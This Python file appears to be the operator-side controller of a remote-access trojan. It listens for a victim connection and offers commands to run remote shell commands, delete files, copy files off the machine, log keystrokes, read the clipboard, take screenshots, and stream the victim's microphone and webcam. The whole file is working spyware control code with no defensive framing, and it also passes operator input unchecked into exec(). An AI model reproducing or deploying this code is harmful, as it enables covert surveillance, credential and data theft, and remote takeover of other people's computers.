import pickle
import socket
import sys

import cv2
import keyboard
import numpy as np
import pyaudio


class Server:

    def __init__(self, host: str, port: int):
        tcp = socket.SOCK_STREAM
        afm = socket.AF_INET
        self.server_socket = socket.socket(afm, tcp)
        self.server_socket.bind((host, port))
        self.server_socket.listen(1)

        self.connection, self.address = self.server_socket.accept()
        print("Connected successfully!\n\nEnter your command or type \"EXIT\" to end session!\n")

        while True:
            self.connection.settimeout(0)
            try:
                while True:
                    if self.connection.recv(4096):
                        pass
                    else:
                        break
            except:
                pass
            self.connection.settimeout(None)
            print('\nEnter your command or type "EXIT" to end session!\n')
            data = input('>>> ')
            if data == "EXIT":
                self.connection.send(data.encode())
                break
            try:
                exec(f"self.{data}()")
            except AttributeError:
                print("Wrong command!")

        self.connection.close()

    def sys_info(self):
        self.connection.send('sys_info'.encode())
        print(self.connection.recv(1024).decode())
        return

    def cmd(self):
        self.connection.send('cmd'.encode())
        while True:
            command = input("Type a command for cmd (type 'exit' to quit cmd): >>> ")
            if command == 'exit':
                self.connection.send(command.encode())
                break
            self.connection.send(command.encode())
            print(self.connection.recv(1024).decode())
        return

    def show_files(self):
        self.connection.send('show_files'.encode())
        system = self.connection.recv(1024).decode()
        print(system)
        if 'Windows' in system:
            self.connection.send('dir'.encode())
        elif 'Linux' in system:
            self.connection.send('ls'.encode())
        print(self.connection.recv(1024).decode())
        return

    def copy_file(self):
        self.connection.send('copy_file'.encode())
        file_name = input('Select file name or path: ')
        self.connection.send(file_name.encode())
        filesize = int(self.connection.recv(1024).decode())
        file_name = input("Set name for copied file: ")
        with open(file_name, "wb") as f:
            bytes_read = self.connection.recv(filesize)
            f.write(bytes_read)
        print('Done!')
        return

    def delete_file(self):
        file_name = input('Select file name or path: ')
        self.connection.send('delete_file'.encode())
        system = self.connection.recv(1024).decode()
        if 'Windows' in system:
            self.connection.send(f'del {file_name}'.encode())
        elif 'Linux' in system:
            self.connection.send(f'rm {file_name}'.encode())
        print(self.connection.recv(1024).decode())
        return

    def show_process(self):
        self.connection.send('show_files'.encode())
        system = self.connection.recv(1024).decode()
        if 'Windows' in system:
            self.connection.send('tasklist'.encode())
        elif 'Linux' in system:
            self.connection.send('ps'.encode())
        print(self.connection.recv(4096).decode())
        return

    def input_capture(self):
        self.connection.send('input_capture'.encode())
        while True:
            print("Recorded paragraph:", end='\n')
            record = b""
            while True:
                packet = self.connection.recv(4096)
                record += packet
                if sys.getsizeof(packet) < 4096:
                    break

            record = pickle.loads(record)
            for i in record:
                data = str(i)
                if ' up' in data:
                    continue
                else:
                    data = data.replace('KeyboardEvent(', '').replace(' down)', '')
                    if len(data) > 1:
                        if data == 'space':
                            print(' ', end='')
                        elif data == 'enter':
                            print('')
                        else:
                            print(f' \"{data}\" ', end='')
                    else:
                        print(data, end='')

            cont = input("Do you want to continue? ")
            if cont.lower() == "no":
                self.connection.send(cont.encode())
                break
            else:
                self.connection.send(cont.encode())
        return

    def clipboard_data(self):
        self.connection.send('clipboard_data'.encode())
        data = self.connection.recv(1024).decode()
        print('Data from clipboard:', data)
        return

    def make_screenshot(self):
        self.connection.send('make_screenshot'.encode())
        screenshot = b""
        while True:
            packet = self.connection.recv(4096)
            screenshot += packet
            if sys.getsizeof(packet) < 4096:
                break
        screenshot = pickle.loads(screenshot)
        name = input('Set name for new screenshot: ')
        screenshot.save(name)
        return

    def audio_capture(self):
        self.connection.send('audio_capture'.encode())
        p = pyaudio.PyAudio()
        CHUNK = 1024 * 4
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100
        stream = p.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        output=True,
                        frames_per_buffer=CHUNK)

        data = self.connection.recv(4096)
        print('Type \"q\" to stop streaming')
        while data != b"":
            data = self.connection.recv(4096)
            stream.write(data)
            if keyboard.is_pressed('q'):
                stream.stop_stream()
                self.connection.send('STOP'.encode())
                break

    def video_capture(self):
        self.connection.send('video_capture'.encode())
        print('Type \"q\" to stop streaming')
        while True:
            data = self.connection.recv(921600)
            data = pickle.loads(data)
            image_arr = np.frombuffer(data, np.uint8)
            image = cv2.imdecode(image_arr, cv2.IMREAD_COLOR)
            if type(image) is None:
                pass
            else:
                cv2.imshow("Received video", image)
                key = cv2.waitKey(10) & 0xff
                if key == ord('q'):
                    cv2.destroyAllWindows()
                    self.connection.send('STOP'.encode())
                    break
        return

    def sinkhole(self):
        self.connection.send('sinkhole'.encode())
        sys_info = self.connection.recv(4096).decode()
        print(sys_info)
        self.connection.close()
        exit(0)


if __name__ == '__main__':
    host = socket.gethostbyname(socket.gethostname())
    print(host)
    port = 5050

    process = Server(host, port)
